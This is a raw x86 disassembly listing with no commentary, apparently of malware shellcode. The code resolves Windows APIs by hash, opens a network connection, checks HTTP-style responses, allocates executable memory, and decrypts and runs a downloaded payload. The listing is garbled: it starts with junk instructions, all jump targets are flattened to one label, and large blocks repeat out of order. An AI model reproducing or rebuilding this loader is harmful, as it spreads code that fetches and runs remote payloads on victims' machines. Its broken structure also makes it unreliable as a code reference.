add [ eax ] al
add [ edi - 0x73 ] bl
mov ch 0x84
ja rwxdata
xor [ edi + 0xabf9cb3 ] dl
insd
add dh cl
int1
frstor [ ebx - 0x41 ]
or bh [ ecx ]
js rwxdata
or ah [ ebp ]
mov ebx 0x23007d0a
and eax 0xabf696c
jne rwxdata
scasd [ edi ]
add bl [ eax ]
test bl dl
or dh [ ecx ]
add [ ecx - 0x2c32e6aa ] bl
or dh [ 0x4cca2800 ]
cli
ror [ edx ] cl
inc ecx
add [ eax - 0x2cd37ddf ] bl
or al [ ebp ]
call 0xffffffffd43c54b9
or cl [ ecx ]
aam 0xfa
sahf
xor al 0xd3
or cl [ ebp ]
cmp ecx [ ecx ]
sub_40729c
push ebp
mov ebp esp
add esp 0xfffffa30
mov esi [ ebp + 0x8 ]
lea eax [ esi + 0x3fb ]
push eax
push 0x0
push 0x0
call [ esi + 0x85 ]
mov [ esi + 0x8c5 ] eax
call [ esi + 0x89 ]
cmp eax 0xb7
jne rwxdata
push esi
lea eax [ esi + 0x96b ]
push eax
lea eax [ esi + 0x145 ]
push eax
call [ esi + 0xfd ]
call sub_4072f1
ja rwxdata
leave
retn 0x4
push 0xbba4d88f
push [ esi + 0xac3 ]
push eax
call [ esi + 0xdd ]
lea ecx [ ebp - 0x196 ]
push ecx
push 0x101
call eax
test eax eax
jne rwxdata
xor bl [ edi + 0x33 ]
xor al [ eax ]
leave
retn 0x4
mov [ ebp - 0x3cc ] 0x2710
cmp [ esi + 0xaf4 ] 0x1
jne rwxdata
mov [ ebp - 0x1bc ] 0x0
cmp [ esi + 0x2c1 ] 0xffffffff
jne rwxdata
mov ecx [ ebp - 0x1bc ]
cmp ecx [ esi + 0x18c ]
jbe rwxdata
cmp [ ebp - 0x1bc ] 0x2
jne rwxdata
push [ esi + 0x18c ]
pop [ esi + 0x2c1 ]
push 0x131
lea eax [ esi + 0x190 ]
push eax
lea eax [ esi + 0x2c5 ]
push eax
call [ esi + 0xa9 ]
mov [ esi + 0x18c ] 0xffffffff
lea edi [ ebp - 0x2bb ]
push edi
push ecx
lea edi [ esi + 0x190 ]
push edi
call [ esi + 0xe9 ]
mov [ esi + 0xaef ] al
mov [ ebp - 0x3cc ] 0xea60
xor ecx ecx
mov [ ebp - 0x1bc ] ecx
cmp [ ebp - 0x5d0 ] 0x3d736b63
jne rwxdata
cmp [ esi + 0xaf5 ] 0x1
jne rwxdata
mov [ ebp - 0x1a4 ] eax
lea eax [ ebp - 0x1a8 ]
push eax
pop [ esi + 0x125 ]
push 0x10
lea eax [ ebp - 0x1a8 ]
push eax
push [ ebp - 0x4 ]
call [ esi + 0x5 ]
or eax eax
jne rwxdata
lea eax [ ebp - 0x2bb ]
push eax
call [ esi + 0x1d ]
or eax eax
jne rwxdata
mov [ ebp - 0x5d0 ] 0x3d736b63
mov [ esi + 0xaef ] 0x1
mov [ ebp - 0x5d0 ] 0x3d707474
mov [ esi + 0xaef ] 0x2
jmp rwxdata
cmp [ esi + 0x18c ] 0xffffffff
jne rwxdata
push [ ebp - 0x4 ]
call [ esi + 0x9 ]
mov [ esi + 0x121 ] 0x0
push [ ebp - 0x3cc ]
call [ esi + 0xa5 ]
add [ ebp - 0x1bc ] 0x1
jmp rwxdata
mov [ ebp - 0x3cc ] 0x2710
cmp [ esi + 0xaef ] 0x0
jle rwxdata
mov eax [ eax + 0xc ]
mov eax [ eax ]
mov eax [ eax ]
jmp rwxdata
jmp rwxdata
push [ ebp - 0x5d0 ]
lea eax [ ebp - 0x2bb ]
push eax
push esi
call [ esi + 0xaf6 ]
test eax eax
je rwxdata
mov [ esi + 0xaf4 ] 0x0
jmp rwxdata
push [ esi + 0x2c1 ]
pop [ esi + 0x18c ]
mov [ esi + 0x2c1 ] 0xffffffff
mov [ esi + 0x8b8 ] 0x1
cmp [ esi + 0xaf4 ] 0x1
jne rwxdata
lea edi [ ebp - 0x4cc ]
xor ecx ecx
mov [ ebp - 0x2c0 ] 0xffffffff
push ecx
call [ esi + 0x15 ]
mov [ ebp - 0x1a6 ] ax
push 0x0
push 0x1
push 0x2
call [ esi + 0x1 ]
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x1a8 ] 0x2
lea eax [ ebp - 0x2bb ]
push eax
call [ esi + 0x19 ]
cmp eax 0xffffffff
jne rwxdata
push esi
call [ esi + 0x11d ]
mov [ ecx + edi ] eax
mov [ ecx + edi + 0x4 ] edx
add ecx 0x8
cmp ecx 0x100
jne rwxdata
push 0x100
push edi
push [ ebp - 0x4 ]
push 0x1
push esi
call [ esi + 0xe5 ]
xor ecx ecx
lea edi [ ebp - 0x3bf ]
push edi
push ecx
lea edi [ esi + 0x2c5 ]
push edi
call [ esi + 0xe9 ]
cmp [ esi + 0xaef ] 0x1
jne rwxdata
mov [ ebp - 0x2c0 ] 0x0
xor ecx ecx
push esi
lea eax [ esi + 0x96b ]
push eax
push edi
push edi
call [ esi + 0x101 ]
add edi 0x10
add ecx 0x1
cmp ecx 0x10
jne rwxdata
push 0x100
lea eax [ ebp - 0x5cc ]
push eax
push [ ebp - 0x4 ]
push 0x0
push esi
call [ esi + 0xe5 ]
push esi
cld
mov ecx 0x40
lea esi [ ebp - 0x4cc ]
lea edi [ ebp - 0x5cc ]
[ esi ] [ edi ]
je rwxdata
call sub_407639
push ecx
call [ esi + 0x15 ]
lea edi [ ebp - 0x3c7 ]
mov [ edi ] 0x4
mov [ edi + 0x1 ] 0x1
mov [ edi + 0x2 ] ax
lea eax [ ebp - 0x3bf ]
push eax
call [ esi + 0x19 ]
cmp eax 0xffffffff
jne rwxdata
pop esi
push 0x4
lea eax [ ebp - 0x8 ]
push eax
push [ ebp - 0x4 ]
push 0x0
push esi
call [ esi + 0xe5 ]
test eax eax
je rwxdata
pop esi
mov [ ebp - 0x3cc ] 0x7530
jmp rwxdata
mov [ edi + 0x4 ] eax
mov [ edi + 0x8 ] 0x0
push 0x9
push edi
push [ ebp - 0x4 ]
push 0x1
push esi
call [ esi + 0xe5 ]
test eax eax
je rwxdata
lea eax [ ebp - 0x3bf ]
push eax
call [ esi + 0x1d ]
test eax eax
je rwxdata
push 0x40
push 0x1000
push [ ebp - 0x8 ]
push 0x0
call [ esi + 0x21 ]
mov edi eax
push [ ebp - 0x8 ]
push eax
push [ ebp - 0x4 ]
push 0x0
push esi
call [ esi + 0xe5 ]
or eax eax
jne rwxdata
push 0x8
push edi
push [ ebp - 0x4 ]
push 0x0
push esi
call [ esi + 0xe5 ]
test eax eax
je rwxdata
add [ ebp - 0x2c0 ] 0x1
mov ecx [ ebp - 0x2c0 ]
cmp ecx [ esi + 0x2c1 ]
jbe rwxdata
mov eax [ eax + 0xc ]
mov eax [ eax ]
mov eax [ eax ]
push edi
mov ecx [ ebp - 0x8 ]
push 0x8000
push 0x0
push edi
call [ esi + 0x25 ]
jmp rwxdata
cmp [ edi + 0x1 ] 0x5a
je rwxdata
push esi
lea eax [ esi + 0x96b ]
push eax
push edi
push edi
call [ esi + 0x105 ]
add edi 0x10
sub ecx 0x10
jne rwxdata
pop edi
push edi
push [ ebp - 0x4 ]
pop [ esi + 0x121 ]
push esi
call edi
pop edi
push 0x8000
push 0x0
push edi
call [ esi + 0x25 ]
cmp [ esi + 0xaf4 ] 0x0
je rwxdata
jmp rwxdata
sub_4072f1
pop eax
push eax
call [ esi + 0x9d ]
mov [ esi + 0xac3 ] eax
call sub_40733e
loope rwxdata
retn
mov ah 0x8e
add [ eax ] eax
rol [ ecx + 0x29 ] 0x1
jl rwxdata
jo rwxdata
add [ esi ] bl
mov ebx 0x1965ec
or al 0x58
in eax dx
0x2d81001d 0x5f7e
jmp rwxdata
or eax 0x3ce88a00
jpe sub_40733e
cmp [ edi ] 0x0
je rwxdata
add ch al
int 0xc6
sbb al 0x9
add bh dl
fild [ 0x9949 ]
add [ eax ] al
add [ edi - 0x7d ] bl
aas
add [ ebx + ebx - 0x1 ] dh
aaa
push 0xbba4d88f
push [ esi + 0xac3 ]
push eax
call [ esi + 0xdd ]
lea ecx [ ebp - 0x196 ]
push ecx
push 0x101
call eax
test eax eax
jne rwxdata
push [ esi + 0xac3 ]
push eax
call [ esi + 0xdd ]
movzx edx [ edi + 0x4 ]
mov [ edx + esi ] eax
add edi 0x6
push [ edi ]
leave
retn 0x4
mov [ ebp - 0x3cc ] 0x2710
cmp [ esi + 0xaf4 ] 0x1
jne rwxdata
mov [ ebp - 0x1bc ] 0x0
cmp [ esi + 0x2c1 ] 0xffffffff
jne rwxdata
mov ecx [ ebp - 0x1bc ]
cmp ecx [ esi + 0x18c ]
jbe rwxdata
cmp [ ebp - 0x1bc ] 0x2
jne rwxdata
push [ esi + 0x18c ]
pop [ esi + 0x2c1 ]
push 0x131
lea eax [ esi + 0x190 ]
push eax
lea eax [ esi + 0x2c5 ]
push eax
call [ esi + 0xa9 ]
mov [ esi + 0x18c ] 0xffffffff
lea edi [ ebp - 0x2bb ]
push edi
push ecx
lea edi [ esi + 0x190 ]
push edi
call [ esi + 0xe9 ]
mov [ esi + 0xaef ] al
mov [ ebp - 0x3cc ] 0xea60
xor ecx ecx
mov [ ebp - 0x1bc ] ecx
cmp [ ebp - 0x5d0 ] 0x3d736b63
jne rwxdata
cmp [ esi + 0xaf5 ] 0x1
jne rwxdata
mov [ ebp - 0x1a4 ] eax
lea eax [ ebp - 0x1a8 ]
push eax
pop [ esi + 0x125 ]
push 0x10
lea eax [ ebp - 0x1a8 ]
push eax
push [ ebp - 0x4 ]
call [ esi + 0x5 ]
or eax eax
jne rwxdata
lea eax [ ebp - 0x2bb ]
push eax
call [ esi + 0x1d ]
or eax eax
jne rwxdata
mov [ ebp - 0x5d0 ] 0x3d736b63
mov [ esi + 0xaef ] 0x1
mov [ ebp - 0x5d0 ] 0x3d707474
mov [ esi + 0xaef ] 0x2
jmp rwxdata
cmp [ esi + 0x18c ] 0xffffffff
jne rwxdata
push [ ebp - 0x4 ]
call [ esi + 0x9 ]
mov [ esi + 0x121 ] 0x0
push [ ebp - 0x3cc ]
call [ esi + 0xa5 ]
add [ ebp - 0x1bc ] 0x1
jmp rwxdata
mov [ ebp - 0x3cc ] 0x2710
cmp [ esi + 0xaef ] 0x0
jle rwxdata
mov eax [ eax + 0xc ]
mov eax [ eax ]
mov eax [ eax ]
jmp rwxdata
jmp rwxdata
push [ ebp - 0x5d0 ]
lea eax [ ebp - 0x2bb ]
push eax
push esi
call [ esi + 0xaf6 ]
test eax eax
je rwxdata
mov [ esi + 0xaf4 ] 0x0
jmp rwxdata
push [ esi + 0x2c1 ]
pop [ esi + 0x18c ]
mov [ esi + 0x2c1 ] 0xffffffff
mov [ esi + 0x8b8 ] 0x1
cmp [ esi + 0xaf4 ] 0x1
jne rwxdata
lea edi [ ebp - 0x4cc ]
xor ecx ecx
mov [ ebp - 0x2c0 ] 0xffffffff
push ecx
call [ esi + 0x15 ]
mov [ ebp - 0x1a6 ] ax
push 0x0
push 0x1
push 0x2
call [ esi + 0x1 ]
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x1a8 ] 0x2
lea eax [ ebp - 0x2bb ]
push eax
call [ esi + 0x19 ]
cmp eax 0xffffffff
jne rwxdata
push esi
call [ esi + 0x11d ]
mov [ ecx + edi ] eax
mov [ ecx + edi + 0x4 ] edx
add ecx 0x8
cmp ecx 0x100
jne rwxdata
push 0x100
push edi
push [ ebp - 0x4 ]
push 0x1
push esi
call [ esi + 0xe5 ]
xor ecx ecx
lea edi [ ebp - 0x3bf ]
push edi
push ecx
lea edi [ esi + 0x2c5 ]
push edi
call [ esi + 0xe9 ]
cmp [ esi + 0xaef ] 0x1
jne rwxdata
mov [ ebp - 0x2c0 ] 0x0
xor ecx ecx
push esi
lea eax [ esi + 0x96b ]
push eax
push edi
push edi
call [ esi + 0x101 ]
add edi 0x10
add ecx 0x1
cmp ecx 0x10
jne rwxdata
push 0x100
lea eax [ ebp - 0x5cc ]
push eax
push [ ebp - 0x4 ]
push 0x0
push esi
call [ esi + 0xe5 ]
push esi
cld
mov ecx 0x40
lea esi [ ebp - 0x4cc ]
lea edi [ ebp - 0x5cc ]
[ esi ] [ edi ]
je rwxdata
call sub_407639
push ecx
call [ esi + 0x15 ]
lea edi [ ebp - 0x3c7 ]
mov [ edi ] 0x4
mov [ edi + 0x1 ] 0x1
mov [ edi + 0x2 ] ax
lea eax [ ebp - 0x3bf ]
push eax
call [ esi + 0x19 ]
cmp eax 0xffffffff
jne rwxdata
pop esi
push 0x4
lea eax [ ebp - 0x8 ]
push eax
push [ ebp - 0x4 ]
push 0x0
push esi
call [ esi + 0xe5 ]
test eax eax
je rwxdata
pop esi
mov [ ebp - 0x3cc ] 0x7530
jmp rwxdata
mov [ edi + 0x4 ] eax
mov [ edi + 0x8 ] 0x0
push 0x9
push edi
push [ ebp - 0x4 ]
push 0x1
push esi
call [ esi + 0xe5 ]
test eax eax
je rwxdata
lea eax [ ebp - 0x3bf ]
push eax
call [ esi + 0x1d ]
test eax eax
je rwxdata
push 0x40
push 0x1000
push [ ebp - 0x8 ]
push 0x0
call [ esi + 0x21 ]
mov edi eax
push [ ebp - 0x8 ]
push eax
push [ ebp - 0x4 ]
push 0x0
push esi
call [ esi + 0xe5 ]
or eax eax
jne rwxdata
push 0x8
push edi
push [ ebp - 0x4 ]
push 0x0
push esi
call [ esi + 0xe5 ]
test eax eax
je rwxdata
add [ ebp - 0x2c0 ] 0x1
mov ecx [ ebp - 0x2c0 ]
cmp ecx [ esi + 0x2c1 ]
jbe rwxdata
mov eax [ eax + 0xc ]
mov eax [ eax ]
mov eax [ eax ]
push edi
mov ecx [ ebp - 0x8 ]
push 0x8000
push 0x0
push edi
call [ esi + 0x25 ]
jmp rwxdata
cmp [ edi + 0x1 ] 0x5a
je rwxdata
push esi
lea eax [ esi + 0x96b ]
push eax
push edi
push edi
call [ esi + 0x105 ]
add edi 0x10
sub ecx 0x10
jne rwxdata
pop edi
push edi
push [ ebp - 0x4 ]
pop [ esi + 0x121 ]
push esi
call edi
pop edi
push 0x8000
push 0x0
push edi
call [ esi + 0x25 ]
cmp [ esi + 0xaf4 ] 0x0
je rwxdata
jmp rwxdata
sub_40733e
pop edi
push 0xbba4d88f
push [ esi + 0xac3 ]
push eax
call [ esi + 0xdd ]
lea ecx [ ebp - 0x196 ]
push ecx
push 0x101
call eax
test eax eax
jne rwxdata
push [ edi ]
push [ esi + 0xac3 ]
push eax
call [ esi + 0xdd ]
movzx edx [ edi + 0x4 ]
mov [ edx + esi ] eax
add edi 0x6
jmp rwxdata
leave
retn 0x4
mov [ ebp - 0x3cc ] 0x2710
cmp [ esi + 0xaf4 ] 0x1
jne rwxdata
cmp [ edi ] 0x0
je rwxdata
mov [ ebp - 0x1bc ] 0x0
cmp [ esi + 0x2c1 ] 0xffffffff
jne rwxdata
mov ecx [ ebp - 0x1bc ]
cmp ecx [ esi + 0x18c ]
jbe rwxdata
cmp [ ebp - 0x1bc ] 0x2
jne rwxdata
push [ esi + 0x18c ]
pop [ esi + 0x2c1 ]
push 0x131
lea eax [ esi + 0x190 ]
push eax
lea eax [ esi + 0x2c5 ]
push eax
call [ esi + 0xa9 ]
mov [ esi + 0x18c ] 0xffffffff
lea edi [ ebp - 0x2bb ]
push edi
push ecx
lea edi [ esi + 0x190 ]
push edi
call [ esi + 0xe9 ]
mov [ esi + 0xaef ] al
mov [ ebp - 0x3cc ] 0xea60
xor ecx ecx
mov [ ebp - 0x1bc ] ecx
cmp [ ebp - 0x5d0 ] 0x3d736b63
jne rwxdata
cmp [ esi + 0xaf5 ] 0x1
jne rwxdata
mov [ ebp - 0x1a4 ] eax
lea eax [ ebp - 0x1a8 ]
push eax
pop [ esi + 0x125 ]
push 0x10
lea eax [ ebp - 0x1a8 ]
push eax
push [ ebp - 0x4 ]
call [ esi + 0x5 ]
or eax eax
jne rwxdata
lea eax [ ebp - 0x2bb ]
push eax
call [ esi + 0x1d ]
or eax eax
jne rwxdata
mov [ ebp - 0x5d0 ] 0x3d736b63
mov [ esi + 0xaef ] 0x1
mov [ ebp - 0x5d0 ] 0x3d707474
mov [ esi + 0xaef ] 0x2
jmp rwxdata
cmp [ esi + 0x18c ] 0xffffffff
jne rwxdata
push [ ebp - 0x4 ]
call [ esi + 0x9 ]
mov [ esi + 0x121 ] 0x0
push [ ebp - 0x3cc ]
call [ esi + 0xa5 ]
add [ ebp - 0x1bc ] 0x1
jmp rwxdata
mov [ ebp - 0x3cc ] 0x2710
cmp [ esi + 0xaef ] 0x0
jle rwxdata
mov eax [ eax + 0xc ]
mov eax [ eax ]
mov eax [ eax ]
jmp rwxdata
jmp rwxdata
push [ ebp - 0x5d0 ]
lea eax [ ebp - 0x2bb ]
push eax
push esi
call [ esi + 0xaf6 ]
test eax eax
je rwxdata
mov [ esi + 0xaf4 ] 0x0
jmp rwxdata
push [ esi + 0x2c1 ]
pop [ esi + 0x18c ]
mov [ esi + 0x2c1 ] 0xffffffff
mov [ esi + 0x8b8 ] 0x1
cmp [ esi + 0xaf4 ] 0x1
jne rwxdata
lea edi [ ebp - 0x4cc ]
xor ecx ecx
mov [ ebp - 0x2c0 ] 0xffffffff
push ecx
call [ esi + 0x15 ]
mov [ ebp - 0x1a6 ] ax
push 0x0
push 0x1
push 0x2
call [ esi + 0x1 ]
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x1a8 ] 0x2
lea eax [ ebp - 0x2bb ]
push eax
call [ esi + 0x19 ]
cmp eax 0xffffffff
jne rwxdata
push esi
call [ esi + 0x11d ]
mov [ ecx + edi ] eax
mov [ ecx + edi + 0x4 ] edx
add ecx 0x8
cmp ecx 0x100
jne rwxdata
push 0x100
push edi
push [ ebp - 0x4 ]
push 0x1
push esi
call [ esi + 0xe5 ]
xor ecx ecx
lea edi [ ebp - 0x3bf ]
push edi
push ecx
lea edi [ esi + 0x2c5 ]
push edi
call [ esi + 0xe9 ]
cmp [ esi + 0xaef ] 0x1
jne rwxdata
mov [ ebp - 0x2c0 ] 0x0
xor ecx ecx
push esi
lea eax [ esi + 0x96b ]
push eax
push edi
push edi
call [ esi + 0x101 ]
add edi 0x10
add ecx 0x1
cmp ecx 0x10
jne rwxdata
push 0x100
lea eax [ ebp - 0x5cc ]
push eax
push [ ebp - 0x4 ]
push 0x0
push esi
call [ esi + 0xe5 ]
push esi
cld
mov ecx 0x40
lea esi [ ebp - 0x4cc ]
lea edi [ ebp - 0x5cc ]
[ esi ] [ edi ]
je rwxdata
call sub_407639
push ecx
call [ esi + 0x15 ]
lea edi [ ebp - 0x3c7 ]
mov [ edi ] 0x4
mov [ edi + 0x1 ] 0x1
mov [ edi + 0x2 ] ax
lea eax [ ebp - 0x3bf ]
push eax
call [ esi + 0x19 ]
cmp eax 0xffffffff
jne rwxdata
pop esi
push 0x4
lea eax [ ebp - 0x8 ]
push eax
push [ ebp - 0x4 ]
push 0x0
push esi
call [ esi + 0xe5 ]
test eax eax
je rwxdata
pop esi
mov [ ebp - 0x3cc ] 0x7530
jmp rwxdata
mov [ edi + 0x4 ] eax
mov [ edi + 0x8 ] 0x0
push 0x9
push edi
push [ ebp - 0x4 ]
push 0x1
push esi
call [ esi + 0xe5 ]
test eax eax
je rwxdata
lea eax [ ebp - 0x3bf ]
push eax
call [ esi + 0x1d ]
test eax eax
je rwxdata
push 0x40
push 0x1000
push [ ebp - 0x8 ]
push 0x0
call [ esi + 0x21 ]
mov edi eax
push [ ebp - 0x8 ]
push eax
push [ ebp - 0x4 ]
push 0x0
push esi
call [ esi + 0xe5 ]
or eax eax
jne rwxdata
push 0x8
push edi
push [ ebp - 0x4 ]
push 0x0
push esi
call [ esi + 0xe5 ]
test eax eax
je rwxdata
add [ ebp - 0x2c0 ] 0x1
mov ecx [ ebp - 0x2c0 ]
cmp ecx [ esi + 0x2c1 ]
jbe rwxdata
mov eax [ eax + 0xc ]
mov eax [ eax ]
mov eax [ eax ]
push edi
mov ecx [ ebp - 0x8 ]
push 0x8000
push 0x0
push edi
call [ esi + 0x25 ]
jmp rwxdata
cmp [ edi + 0x1 ] 0x5a
je rwxdata
push esi
lea eax [ esi + 0x96b ]
push eax
push edi
push edi
call [ esi + 0x105 ]
add edi 0x10
sub ecx 0x10
jne rwxdata
pop edi
push edi
push [ ebp - 0x4 ]
pop [ esi + 0x121 ]
push esi
call edi
pop edi
push 0x8000
push 0x0
push edi
call [ esi + 0x25 ]
cmp [ esi + 0xaf4 ] 0x0
je rwxdata
jmp rwxdata
sub_407639
pop edx
lea edi [ ebp - 0x4cc ]
lea ebx [ ebp - 0x3bf ]
push 0xa10a30b6
push [ esi + 0xabf ]
push [ esi + 0xe1 ]
call [ esi + 0xdd ]
push ecx
push ebx
push edx
push edi
call eax
push eax
push edi
push [ ebp - 0x4 ]
push 0x1
push esi
call [ esi + 0xe5 ]
test eax eax
je rwxdata
push [ ebp - 0x4 ]
call [ esi + 0x9 ]
mov [ esi + 0x121 ] 0x0
push [ ebp - 0x3cc ]
call [ esi + 0xa5 ]
add [ ebp - 0x1bc ] 0x1
jmp rwxdata
add edi 0x4
push edi
mov [ esi + 0x8b8 ] 0x1
cmp [ esi + 0xaf4 ] 0x1
jne rwxdata
add edi 0x1
jmp rwxdata
jmp rwxdata
mov ecx [ ebp - 0x1bc ]
cmp ecx [ esi + 0x18c ]
jbe rwxdata
cmp [ ebp - 0x1bc ] 0x2
jne rwxdata
push 0x1
push edi
push [ ebp - 0x4 ]
push 0x0
push esi
call [ esi + 0xe5 ]
cmp [ edi - 0x3 ] 0xa0d0a0d
jne rwxdata
pop edi
cmp [ edi ] 0x20333035
je rwxdata
lea edi [ ebp - 0x2bb ]
push edi
push ecx
lea edi [ esi + 0x190 ]
push edi
call [ esi + 0xe9 ]
mov [ esi + 0xaef ] al
mov [ ebp - 0x3cc ] 0xea60
xor ecx ecx
mov [ ebp - 0x1bc ] ecx
cmp [ ebp - 0x5d0 ] 0x3d736b63
jne rwxdata
cmp [ esi + 0xaf5 ] 0x1
jne rwxdata
add [ ebp - 0x2c0 ] 0x1
mov ecx [ ebp - 0x2c0 ]
cmp ecx [ esi + 0x2c1 ]
jbe rwxdata
cmp [ edi + 0x9 ] 0x20303032
jne rwxdata
mov [ ebp - 0x1a4 ] eax
lea eax [ ebp - 0x1a8 ]
push eax
pop [ esi + 0x125 ]
push 0x10
lea eax [ ebp - 0x1a8 ]
push eax
push [ ebp - 0x4 ]
call [ esi + 0x5 ]
or eax eax
jne rwxdata
lea eax [ ebp - 0x2bb ]
push eax
call [ esi + 0x1d ]
or eax eax
jne rwxdata
mov [ ebp - 0x5d0 ] 0x3d736b63
mov [ esi + 0xaef ] 0x1
mov [ ebp - 0x5d0 ] 0x3d707474
mov [ esi + 0xaef ] 0x2
jmp rwxdata
cmp [ esi + 0x18c ] 0xffffffff
jne rwxdata
lea edi [ ebp - 0x3bf ]
push edi
push ecx
lea edi [ esi + 0x2c5 ]
push edi
call [ esi + 0xe9 ]
cmp [ esi + 0xaef ] 0x1
jne rwxdata
mov [ ebp - 0x2c0 ] 0x0
xor ecx ecx
lea edi [ ebp - 0x4cc ]
xor ecx ecx
mov [ ebp - 0x3cc ] 0x2710
cmp [ esi + 0xaef ] 0x0
jle rwxdata
mov eax [ eax + 0xc ]
mov eax [ eax ]
mov eax [ eax ]
jmp rwxdata
jmp rwxdata
push [ ebp - 0x5d0 ]
lea eax [ ebp - 0x2bb ]
push eax
push esi
call [ esi + 0xaf6 ]
test eax eax
je rwxdata
mov [ esi + 0xaf4 ] 0x0
jmp rwxdata
push [ esi + 0x2c1 ]
pop [ esi + 0x18c ]
mov [ esi + 0x2c1 ] 0xffffffff
call sub_407639
push ecx
call [ esi + 0x15 ]
lea edi [ ebp - 0x3c7 ]
mov [ edi ] 0x4
mov [ edi + 0x1 ] 0x1
mov [ edi + 0x2 ] ax
lea eax [ ebp - 0x3bf ]
push eax
call [ esi + 0x19 ]
cmp eax 0xffffffff
jne rwxdata
push esi
call [ esi + 0x11d ]
mov [ ecx + edi ] eax
mov [ ecx + edi + 0x4 ] edx
add ecx 0x8
cmp ecx 0x100
jne rwxdata
push 0x100
push edi
push [ ebp - 0x4 ]
push 0x1
push esi
call [ esi + 0xe5 ]
xor ecx ecx
mov [ ebp - 0x2c0 ] 0xffffffff
push ecx
call [ esi + 0x15 ]
mov [ ebp - 0x1a6 ] ax
push 0x0
push 0x1
push 0x2
call [ esi + 0x1 ]
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x1a8 ] 0x2
lea eax [ ebp - 0x2bb ]
push eax
call [ esi + 0x19 ]
cmp eax 0xffffffff
jne rwxdata
mov [ ebp - 0x1bc ] 0x0
mov [ edi + 0x4 ] eax
mov [ edi + 0x8 ] 0x0
push 0x9
push edi
push [ ebp - 0x4 ]
push 0x1
push esi
call [ esi + 0xe5 ]
test eax eax
je rwxdata
lea eax [ ebp - 0x3bf ]
push eax
call [ esi + 0x1d ]
test eax eax
je rwxdata
push esi
lea eax [ esi + 0x96b ]
push eax
push edi
push edi
call [ esi + 0x101 ]
add edi 0x10
add ecx 0x1
cmp ecx 0x10
jne rwxdata
push 0x100
lea eax [ ebp - 0x5cc ]
push eax
push [ ebp - 0x4 ]
push 0x0
push esi
call [ esi + 0xe5 ]
push esi
cld
mov ecx 0x40
lea esi [ ebp - 0x4cc ]
lea edi [ ebp - 0x5cc ]
[ esi ] [ edi ]
je rwxdata
push 0x8
push edi
push [ ebp - 0x4 ]
push 0x0
push esi
call [ esi + 0xe5 ]
test eax eax
je rwxdata
mov eax [ eax + 0xc ]
mov eax [ eax ]
mov eax [ eax ]
pop esi
push 0x4
lea eax [ ebp - 0x8 ]
push eax
push [ ebp - 0x4 ]
push 0x0
push esi
call [ esi + 0xe5 ]
test eax eax
je rwxdata
pop esi
mov [ ebp - 0x3cc ] 0x7530
jmp rwxdata
cmp [ edi + 0x1 ] 0x5a
je rwxdata
push 0x40
push 0x1000
push [ ebp - 0x8 ]
push 0x0
call [ esi + 0x21 ]
mov edi eax
push [ ebp - 0x8 ]
push eax
push [ ebp - 0x4 ]
push 0x0
push esi
call [ esi + 0xe5 ]
or eax eax
jne rwxdata
cmp [ esi + 0xaf4 ] 0x0
je rwxdata
push edi
mov ecx [ ebp - 0x8 ]
push 0x8000
push 0x0
push edi
call [ esi + 0x25 ]
jmp rwxdata
jmp rwxdata
push esi
lea eax [ esi + 0x96b ]
push eax
push edi
push edi
call [ esi + 0x105 ]
add edi 0x10
sub ecx 0x10
jne rwxdata
pop edi
push edi
push [ ebp - 0x4 ]
pop [ esi + 0x121 ]
push esi
call edi
pop edi
push 0x8000
push 0x0
push edi
call [ esi + 0x25 ]
sub_4077ed
push ebp
mov ebp esp
push esi
push edi
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
xor edx edx
xor eax eax
mov ecx eax
add esi eax
add esi 0x3
add edx 0x1
jmp rwxdata
mov [ edi ] 0x0
movzx eax [ esi ]
movzx ecx [ esi + 0x1 ]
pop edi
pop esi
leave
retn 0xc
mov al [ esi ]
mov [ edi ] al
add esi 0x1
add edi 0x1
sub ecx 0x1
jmp rwxdata
mov al [ esi ]
add esi 0x1
cmp ecx edx
je rwxdata
cmp ecx 0x0
je rwxdata
sub_407838
push ebp
mov ebp esp
add esp 0xfffffeec
pushad
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x10c ] 0x1
push [ ebp + 0x10 ]
pop [ ebp - 0x108 ]
mov [ ebp - 0x114 ] 0xb4
mov [ ebp - 0x110 ] 0x0
xor eax eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] eax
push 0x0
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
cmp [ ebp + 0xc ] 0x0
jne rwxdata
lea eax [ ebp - 0x114 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x10c ]
push eax
push 0x0
call [ esi + 0x99 ]
cmp eax 0x0
jbe rwxdata
call [ esi + 0xd ]
call [ esi + 0x11 ]
jmp rwxdata
popad
xor eax eax
leave
retn 0x14
add [ ebp + 0x14 ] eax
add [ ebp - 0x8 ] eax
sub [ ebp + 0x18 ] eax
cmp [ ebp + 0x18 ] 0x0
jne rwxdata
cmp eax 0x1
jge rwxdata
cmp [ ebp + 0xc ] 0x0
jne rwxdata
popad
mov eax [ ebp - 0x8 ]
leave
retn 0x14
sub_4078d5
push ebp
mov ebp esp
add esp 0xffffffec
push esi
push ebx
push edi
push edx
push ecx
mov eax [ ebp + 0x10 ]
xor edx edx
xchg edx eax
mov esi 0x3c
add esi [ ebp + 0xc ]
mov eax [ esi ]
add eax [ ebp + 0xc ]
mov esi [ eax + 0x78 ]
add esi 0x18
add esi [ ebp + 0xc ]
mov eax [ esi ]
mov [ ebp - 0x14 ] eax
add esi 0x4
lea edi [ ebp - 0x8 ]
lodsd [ esi ]
add eax [ ebp + 0xc ]
stosd [ edi ]
mov [ ebp - 0x8 ] eax
lodsd [ esi ]
add eax [ ebp + 0xc ]
push eax
stosd [ edi ]
mov [ ebp - 0xc ] eax
mov eax [ esi ]
add eax [ ebp + 0xc ]
mov [ ebp - 0x10 ] eax
pop esi
mov [ ebp - 0x4 ] 0x0
push esi
mov eax [ esi ]
add eax [ ebp + 0xc ]
xchg edi eax
mov ebx edi
push edi
xor al al
xor eax eax
pop ecx
pop edx
pop edi
pop ebx
pop esi
leave
retn 0xc
scasb [ edi ]
jne rwxdata
pop esi
sub edi ebx
push edx
cld
xor ecx ecx
dec ecx
mov edx ecx
dec dh
jne rwxdata
xor ax 0x8320
xor bx 0xedb8
shr bx 0x1
rcr ax 0x1
jae rwxdata
xor ecx eax
xor edx ebx
dec edi
jne rwxdata
